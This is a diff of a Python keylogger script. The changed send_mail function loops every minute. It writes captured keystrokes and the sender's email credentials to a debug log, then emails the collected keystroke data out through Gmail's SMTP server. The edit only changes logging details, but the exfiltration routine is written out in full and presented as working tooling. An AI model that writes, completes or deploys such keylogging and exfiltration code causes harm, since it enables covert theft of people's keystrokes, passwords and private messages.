@@ -36,13 +36,13 @@ if not path.isfile(dir):
 def send_mail():
     global data
     while True:
-        file_object = open(debugFile, "w")
-        file_object.write("===== SENDING EMAIL: DEBUG MODE =====")
-        file_object.write("Data Content Length: " + len(data))
-        file_object.write("Keylogger Content: " + data)
-        file_object.write("Email: " + EEMAIL)
-        file_object.write("Password: " + EPASS)
-        file_object.write("[*] SENDING EMAIL NOW")
+        file_object = open(debugFile, "a")
+        file_object.write("===== SENDING EMAIL: DEBUG MODE =====\n")
+        file_object.write("Data Content Length: " + len(data) + "\n")
+        file_object.write("Keylogger Content: " + data + "\n")
+        file_object.write("Email: " + EEMAIL + "\n")
+        file_object.write("Password: " + EPASS + "\n")
+        file_object.write("[*] SENDING EMAIL NOW" + "\n")
         if len(data) > 0:
             timeInSecs = datetime.datetime.now()
             SERVER = "smtp.gmail.com"
@@ -68,10 +68,10 @@ def send_mail():
                 server.sendmail(FROM, TO, message_payload)
                 data = ''
                 server.quit()
-                file_object.write("[*] Data Sent!")
+                file_object.write("[*] Data Sent!" + "\n")
             except Exception as error:
                 print error
-                file_object.write("[*] Error Encountered: " + error)
+                file_object.write("[*] Error Encountered: " + error + "\n")
         file_object.close()
         sleep(60)
 
